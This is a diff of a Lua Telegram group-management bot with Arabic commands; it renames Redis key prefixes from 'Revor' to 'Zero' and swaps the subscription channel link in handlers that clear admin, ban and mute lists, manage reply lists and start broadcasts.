 if TextMsg == 'الادمنيه' then
@@ -8251,14 +8254,14 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Addictive:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Addictive:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد ادمنيه حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Addictive:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :Addictive:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من الادمنيه *","md",true)
 end
 if TextMsg == 'المميزين' then
@@ -8266,14 +8269,14 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:Distinguished:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :Distinguished:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مميزين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:Distinguished:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :Distinguished:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المميزين *","md",true)
 end
 if TextMsg == 'المحظورين عام' then
@@ -8281,14 +8284,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :BanAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين عام حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:BanAll:Groups") 
+Redis:del(Zero .."Zero :BanAll:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المحظورين عام *","md",true)
 end
 if TextMsg == 'المكتومين عام' then
@@ -8296,14 +8299,14 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanAll:Groups") 
+local Info_Members = Redis:smembers(Zero .."Zero :BanAll:Groups") 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مكتومين عام حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:ktmAll:Groups") 
+Redis:del(Zero .."Zero :ktmAll:Groups") 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المكتومين عام *","md",true)
 end
 if TextMsg == 'المحظورين' then
@@ -8311,14 +8314,14 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:BanGroup:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :BanGroup:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد محظورين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:BanGroup:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :BanGroup:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المحظورين *","md",true)
 end
 if TextMsg == 'المكتومين' then
@@ -8326,14 +8329,14 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local Info_Members = Redis:smembers(Revor.."Revor:SilentGroup:Group"..msg_chat_id) 
+local Info_Members = Redis:smembers(Zero .."Zero :SilentGroup:Group"..msg_chat_id) 
 if #Info_Members == 0 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙لا يوجد مكتومين حاليا , ","md",true)  
 end
-Redis:del(Revor.."Revor:SilentGroup:Group"..msg_chat_id) 
+Redis:del(Zero .."Zero :SilentGroup:Group"..msg_chat_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,"*⌔︙تم مسح {"..#Info_Members.."} من المكتومين *","md",true)
 end
 if TextMsg == 'المقيدين' then
@@ -8341,7 +8344,7 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if GetInfoBot(msg).BanUser == false then
@@ -8366,7 +8369,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8391,7 +8394,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8416,7 +8419,7 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 if msg.can_be_deleted_for_all_users == false then
@@ -8447,21 +8450,21 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Manager"..msg_chat_id.."")
+local list = Redis:smembers(Zero .."Zero :List:Manager"..msg_chat_id.."")
 for k,v in pairs(list) do
-Redis:del(Revor.."Revor:Add:Rd:Manager:Gif"..v..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Vico"..v..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Stekrs"..v..msg_chat_id)     
-Redis:del(Revor.."Revor:Add:Rd:Manager:Text"..v..msg_chat_id)   
-Redis:del(Revor.."Revor:Add:Rd:Manager:Photo"..v..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Video"..v..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:File"..v..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:video_note"..v..msg_chat_id)
-Redis:del(Revor.."Revor:Add:Rd:Manager:Audio"..v..msg_chat_id)
-Redis:del(Revor.."Revor:List:Manager"..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Gif"..v..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Vico"..v..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Stekrs"..v..msg_chat_id)     
+Redis:del(Zero .."Zero :Add:Rd:Manager:Text"..v..msg_chat_id)   
+Redis:del(Zero .."Zero :Add:Rd:Manager:Photo"..v..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Video"..v..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:File"..v..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:video_note"..v..msg_chat_id)
+Redis:del(Zero .."Zero :Add:Rd:Manager:Audio"..v..msg_chat_id)
+Redis:del(Zero .."Zero :List:Manager"..msg_chat_id)
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم مسح قائمه ردود المدير","md",true)  
 end
@@ -8470,29 +8473,29 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Manager"..msg_chat_id.."")
+local list = Redis:smembers(Zero .."Zero :List:Manager"..msg_chat_id.."")
 text = "⌔︙قائمه ردود المدير \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 for k,v in pairs(list) do
-if Redis:get(Revor.."Revor:Add:Rd:Manager:Gif"..v..msg_chat_id) then
+if Redis:get(Zero .."Zero :Add:Rd:Manager:Gif"..v..msg_chat_id) then
 db = "متحركه 🎭"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Vico"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Vico"..v..msg_chat_id) then
 db = "بصمه 📢"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Stekrs"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Stekrs"..v..msg_chat_id) then
 db = "ملصق 🃏"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Text"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Text"..v..msg_chat_id) then
 db = "رساله ✉"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Photo"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Photo"..v..msg_chat_id) then
 db = "صوره 🎇"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Video"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Video"..v..msg_chat_id) then
 db = "فيديو 📹"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:File"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:File"..v..msg_chat_id) then
 db = "ملف ⌔"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:Audio"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:Audio"..v..msg_chat_id) then
 db = "اغنيه 🎵"
-elseif Redis:get(Revor.."Revor:Add:Rd:Manager:video_note"..v..msg_chat_id) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Manager:video_note"..v..msg_chat_id) then
 db = "بصمه فيديو 🎥"
 end
 text = text..""..k.." » {"..v.."} » {"..db.."}\n"
@@ -8507,10 +8510,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,true)
+Redis:set(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لاضافتها في ردود المدير ","md",true)  
 end
 if text == "حذف رد" then
@@ -8518,10 +8521,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true2")
+Redis:set(Zero .."Zero :Set:Manager:rd"..msg.sender.user_id..":"..msg_chat_id,"true2")
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لحذفها من ردود المدير","md",true)  
 end
 if text == ("مسح ردود المطور") then 
@@ -8529,21 +8532,21 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Rd:Sudo")
+local list = Redis:smembers(Zero .."Zero :List:Rd:Sudo")
 for k,v in pairs(list) do
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Gif"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:vico"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:stekr"..v)     
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Text"..v)   
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Photo"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Video"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:File"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:Audio"..v)
-Redis:del(Revor.."Revor:Add:Rd:Sudo:video_note"..v)
-Redis:del(Revor.."Revor:List:Rd:Sudo")
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Gif"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:vico"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:stekr"..v)     
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Text"..v)   
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Photo"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Video"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:File"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:Audio"..v)
+Redis:del(Zero .."Zero :Add:Rd:Sudo:video_note"..v)
+Redis:del(Zero .."Zero :List:Rd:Sudo")
 end
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف ردود المطور","md",true)  
 end
@@ -8552,29 +8555,29 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-local list = Redis:smembers(Revor.."Revor:List:Rd:Sudo")
+local list = Redis:smembers(Zero .."Zero :List:Rd:Sudo")
 text = "\n📝︙قائمة ردود المطور \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
 for k,v in pairs(list) do
-if Redis:get(Revor.."Revor:Add:Rd:Sudo:Gif"..v) then
+if Redis:get(Zero .."Zero :Add:Rd:Sudo:Gif"..v) then
 db = "متحركه 🎭"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:vico"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:vico"..v) then
 db = "بصمه 📢"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:stekr"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:stekr"..v) then
 db = "ملصق 🃏"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Text"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Text"..v) then
 db = "رساله ✉"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Photo"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Photo"..v) then
 db = "صوره 🎇"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Video"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Video"..v) then
 db = "فيديو 📹"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:File"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:File"..v) then
 db = "ملف ⌔"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:Audio"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:Audio"..v) then
 db = "اغنيه 🎵"
-elseif Redis:get(Revor.."Revor:Add:Rd:Sudo:video_note"..v) then
+elseif Redis:get(Zero .."Zero :Add:Rd:Sudo:video_note"..v) then
 db = "بصمه فيديو 🎥"
 end
 text = text..""..k.." » {"..v.."} » {"..db.."}\n"
@@ -8589,10 +8592,10 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
+Redis:set(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لاضافتها في ردود المطور ","md",true)  
 end
 if text == "حذف رد للكل" then 
@@ -8600,24 +8603,24 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
+Redis:set(Zero .."Zero :Set:On"..msg.sender.user_id..":"..msg_chat_id,true)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙ارسل الان الكلمه لحذفها من ردود المطور","md",true)  
 end
 if text=="اذاعه خاص" then 
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:SendBcBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :SendBcBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Users" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -8633,14 +8636,14 @@ if text=="اذاعه" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:SendBcBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :SendBcBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -8656,14 +8659,14 @@ if text=="اذاعه بالتثبيت" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:SendBcBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :SendBcBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:setex(Revor.."Revor:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
+Redis:setex(Zero .."Zero :Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -8679,14 +8682,14 @@ if text=="اذاعه بالتوجيه" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if not msg.ControllerBot and not Redis:set(Revor.."Revor:SendBcBot") then
+if not msg.ControllerBot and not Redis:set(Zero .."Zero :SendBcBot") then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙امر المغادره معطل من قبل الاساسي ',"md",true)  
 end
 if ChannelJoin(msg) == false then
